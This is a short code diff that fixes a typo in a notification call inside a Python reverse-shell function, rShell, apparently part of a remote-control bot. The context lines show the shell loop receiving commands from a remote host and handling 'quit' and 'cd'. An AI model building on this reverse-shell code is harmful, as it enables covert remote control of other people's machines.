@@ -221,7 +221,7 @@ def rShell(rsHost, rsPort):
                 data = rs.recv(1024).decode("UTF-8")
                 if data == "quit":
                     rs.close()
-                    sendnetc("[x] Closed reverse shell connection with "+ rsHost +":"+ rsPort +"!", adminname)
+                    sendntc("[x] Closed reverse shell connection with "+ rsHost +":"+ rsPort +"!", adminname)
                     if debugmode:
                         print("[x] Closed reverse shell connection with "+ rsHost +":"+ rsPort +"!")
                 if data[:2] == "cd":
